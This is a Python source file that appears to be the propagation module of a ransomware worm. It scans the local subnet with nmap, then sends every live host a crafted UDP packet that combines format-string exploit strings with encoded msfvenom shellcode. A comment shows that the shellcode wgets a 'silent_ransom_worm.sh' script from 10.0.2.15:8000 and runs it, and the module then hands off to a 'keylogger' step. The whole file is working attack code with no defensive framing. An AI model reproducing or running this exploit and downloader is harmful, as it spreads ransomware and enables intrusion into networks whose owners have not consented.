#!/usr/bin/env python
import struct
import socket
import netifaces as ni
import subprocess
import ipaddress

# Function to get the network and subnet mask of the primary interface
def get_interface():
    gateways = ni.gateways()
    default_gateway = gateways['default'][ni.AF_INET][1]
    interface = gateways['default'][ni.AF_INET][1]
    return interface

def get_network(interface):
    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
    return network

def net_scan(network):
    try:
        print('Scanning Network')
        # Run nmap and pipe its output to awk
        command = f'nmap -oG - {network} | awk \'/Up$/{{print $2}}\''
        output = subprocess.check_output(command, shell=True, universal_newlines=True)

        # Split the output by newlines to get a list of IPs
        ip_addresses = output.strip().split('\n')
        print('Done!', len(ip_addresses), 'Hosts are up')
        return ip_addresses
    except subprocess.CalledProcessError as e:
        return []


def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])

    # Check if hn is a byte string or a regular string and handle accordingly
    if isinstance(hn, str):
        d += struct.pack('>I', len(hn)) + hn.encode()
    else:
        d += struct.pack('>I', len(hn)) + hn

    # Similar check for user, inf, and func
    if isinstance(user, str):
        d += struct.pack('>I', len(user)) + user.encode()
    else:
        d += struct.pack('>I', len(user)) + user

    d += struct.pack('>I', 0)

    if isinstance(inf, str):
        d += struct.pack('>I', len(inf)) + inf.encode()
    else:
        d += struct.pack('>I', len(inf)) + inf

    d += bytes([0])

    if isinstance(func, str):
        d += struct.pack('>I', len(func)) + func.encode()
    else:
        d += struct.pack('>I', len(func)) + func

    d += bytes([0x2, 0xc3, 0x51])
    return d

#msfvenom -p linux/x64/exec CMD="/usr/bin/wget -O silent_ransom_worm.sh '10.0.2.15:8000/send_ransomworm_silent'; chmod +x silent_ransom_worm.sh; ./silent_ransom_worm.sh;" -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xea\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x95\xcb\xd5"
shellcode += b"\xbd\xdf\xcf\xcb\x10\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xdd\x73\xfa\xdf\xb6"
shellcode += b"\xa1\xe4\x63\xfd\xcb\x4c\xed\x8b\x90\x99\x76"
shellcode += b"\xfd\xe6\xb6\xe9\x81\x9d\x23\x99\x95\xcb\xd5"
shellcode += b"\x92\xaa\xbc\xb9\x3f\xf7\xa2\xbb\x92\xa8\xa8"
shellcode += b"\xae\x64\xb5\xe6\x9a\x9d\xac\xa6\xa7\x75\xfb"
shellcode += b"\xbf\x8a\xcf\xbe\xa1\xb8\x7f\xf8\x94\xa2\xd2"
shellcode += b"\xad\xa2\xe5\x63\xfd\xeb\xf2\x8c\xef\xe1\xfb"
shellcode += b"\x3e\xa7\xe5\xe4\x88\xe5\xf7\xfb\x20\xa5\xe4"
shellcode += b"\xa6\xd8\xb1\xab\x94\x62\xf4\xa5\xa6\xd2\xb2"
shellcode += b"\xb8\xa4\x62\xf8\x94\xa6\xd4\xb3\xaa\xa5\x64"
shellcode += b"\xb2\xf0\xf5\xde\xb7\xa2\xa4\x74\xb5\xe0\xad"
shellcode += b"\x9d\xac\xa6\xa7\x75\xfb\xbf\x8a\xcf\xbe\xa1"
shellcode += b"\xb8\x7f\xf8\x94\xa2\xd2\xad\xa2\xe5\x63\xfd"
shellcode += b"\xf0\xf5\x93\xf0\xbc\xa2\x7c\xf0\xa5\xa1\xe2"
shellcode += b"\xad\xae\xa5\x63\xfa\xa6\x8a\xca\xb0\xbd\xa6"
shellcode += b"\x3e\xe6\xa3\xee\xbd\x89\x98\x9f\x4e\xff\xf0"
shellcode += b"\x8d\xb2\xda\xcf\xcb\x10"

def run():
    next_action = ""
    data = "no_data"
    print("[+] Propagation module activated...")

    try:
        interface = get_interface()
        network = get_network(interface)
        port = 50001
        neighbors = net_scan(network)
        print('Lets attack')
        print('Brute all active Hosts on Port 50001')
        
        for ip in neighbors:
            print(f'IP: {ip}')
            p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(p, (ip, port))
            s.close()
                
    except Exception as e: 
            print(e)
            pass

    next_action = "keylogger"
    return data, next_action
